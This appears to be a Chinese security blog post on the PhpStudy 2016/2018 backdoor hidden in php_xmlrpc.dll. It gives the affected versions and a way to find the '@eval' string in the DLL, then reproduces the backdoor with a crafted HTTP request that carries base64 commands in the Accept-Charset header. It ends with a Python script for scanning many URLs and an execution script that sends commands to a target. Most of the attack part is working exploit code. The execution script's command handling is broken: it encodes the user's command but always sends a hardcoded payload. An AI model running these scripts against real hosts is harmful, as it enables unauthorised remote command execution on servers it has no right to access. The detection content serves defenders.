---
title: PhpStudy2018后门漏洞预警及漏洞复现&检测和执行POC脚本
date: 2020-06-03 17:44:51
categories: 
- 漏洞复现
tags: 
- 漏洞
- 后门
- POC
- PhpStudy2018
- 漏洞复现
---




## phpstudy介绍
Phpstudy是国内的一款免费的PHP调试环境的程序集成包，其通过集成Apache、PHP、MySQL、phpMyAdmin、ZendOPtimizer不同版本软件于一身，一次性安装无需配置即可直接使用，具有PHP环境调试和PHP开发功能。由于其免费且方便的特性，在国内有着近百万的PHP语言学习者和开发者用户

## 后门事件
2018年12月4日，西湖区公安分局网警大队接报案，某公司发现公司内有20余台计算机被执行危险命令，疑似远程控制抓取账号密码等计算机数据回传大量敏感信息。通过专业技术溯源进行分析，查明了数据回传的信息种类、原理方法、存储位置，并聘请了第三方鉴定机构对软件中的“后门”进行司法鉴定，鉴定结果是该“后门”文件具有控制计算机的功能，嫌疑人已通过该后门远程控制下载运行脚本实现收集用户个人信息。在2019年9月20日，网上爆出phpstudy存在“后门”。作者随后发布了声明。
于是想起自己安装过phpstudy软件，赶紧查一下是否存在后门文件，结果一看真存在后门，学个PHP真是不容易，软件被别人偷偷安装了后门。

<!--more-->

## 影响版本
目前已知受影响的phpstudy版本
phpstudy 2016版php-5.4
phpstudy 2018版php-5.2.17
phpstudy 2018版php-5.4.45

## 后门检测分析
通过分析，后门代码存在于\ext\php_xmlrpc.dll模块中
phpStudy2016和phpStudy2018自带的php-5.2.17、php-5.4.45
phpStudy2016路径
`php\php-5.2.17\ext\php_xmlrpc.dll`
`php\php-5.4.45\ext\php_xmlrpc.dll`
phpStudy2018路径
`PHPTutorial\php\php-5.2.17\ext\php_xmlrpc.dll`
`PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dll`
用notepad打开此文件查找@eval，文件存在`@eval(%s(‘%s’))`证明漏洞存在，如图：
![](1.png)


## phpstudy 2018漏洞复现

启动phpstudy，选择php-5.2.17版本，使用burpsuit抓包（如果是本机127.0.0.1环境，代理去掉本地过滤，否则抓不到包）。

![](2.png)

大佬给出exp如下
```
GET /index.php HTTP/1.1
Host: yourip.com
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3730.400 QQBrowser/10.5.3805.400
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip,deflate
Accept-Charset:这里就是你要执行的代码命令（经过base64加密）
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```
我们修改数据包查看命令`phpinfo();`执行情况

![](3.png)

继续修改数据包查看命令`echo system("net user");`执行情况

![](4.png)


漏洞复现成功
ps：我复现的时候这里有一个坑，就是直接repeater过来的数据包`Accept-Encoding`字段的参数是`gzip, deflate`,`deflate`前面有一个空格，去掉就可以成功执行命令了

## 后门检测脚本

```python
# !/usr/bin/env python
# -*- coding:utf-8 -*-

import gevent
from gevent import monkey

gevent.monkey.patch_all()
import requests as rq


def file_read(file_name="url.txt"):
    with open(file_name, "r") as f:
        return [i.replace("\n", "") for i in f.readlines()]


def check(url):
    '''
    if "http://" or "https://" not in url:
        url = "https://" + url
    '''
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'Sec-Fetch-Site': 'none',
        'accept-charset': 'ZWNobyBlZVN6eHU5Mm5JREFiOw==',  # 输出 eeSzxu92nIDAb
        'Accept-Encoding': 'gzip,deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
    }
    try:
        res = rq.get(url, headers=headers, timeout=20)
        if res.status_code == 200:
            if res.text.find('eeSzxu92nIDAb'):
                print("[存在漏洞] " + url)
    except:
        print("[超时] " + url)


if __name__ == '__main__':
    print("phpStudy 批量检测 (需要 gevent,requests 库)")
    print("使用之前，请将URL保存为 url.txt 放置此程序同目录下")
    input("任意按键开始执行..")
    tasks = [gevent.spawn(check, url) for url in file_read()]
    print("正在执行...请等候")
    gevent.joinall(tasks)
    wait = input("执行完毕 任意键退出...")

```

## 后门执行脚本

```python
# !/usr/bin/env python
# -*- coding:utf-8 -*-

import requests
import base64


def backdoor(url, command="system('calc.exe');"):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'Sec-Fetch-Site': 'none',
        'accept-charset': 'c3lzdGVtKCdjYWxjLmV4ZScpOw==',
        'Accept-Encoding': 'gzip,deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
    }
    command = base64.b64encode(command.encode('utf-8'))
    command = str(command, 'utf-8')
    result = requests.get(url, headers=headers, verify=False)
    if result.status_code == "200":
        print("执行完成")
    a = input("任意键退出...")


url = input("输入URL(例如:http://127.0.0.1:228/xx.php)\n")
command = input("输入命令 默认为 system('calc.exe'); (不想输入直接回车)\n")
backdoor(url, command)

```

## 参考
PhpStudyGhost后门供应链攻击事件及相关IOC
https://www.freebuf.com/column/214946.html
PHPStudy后门分析+复现&附批量Py脚本
https://mp.weixin.qq.com/s/Y29wifB6XTDcJN-RPDMwxg
phpstudy后门文件分析以及检测脚本
https://mp.weixin.qq.com/s/dIDfgFxHlqenKRUSW7Oqkw
Phpstudy官网于2016年被入侵，犯罪分子篡改软件并植入后门
https://mp.weixin.qq.com/s/CqHrDFcubyn_y5NTfYvkQw
phpstudy后门文件分析以及检测脚本
https://mp.weixin.qq.com/s/dIDfgFxHlqenKRUSW7Oqkw
phpStudy隐藏后门预警
https://www.cnblogs.com/0daybug/p/11571119.html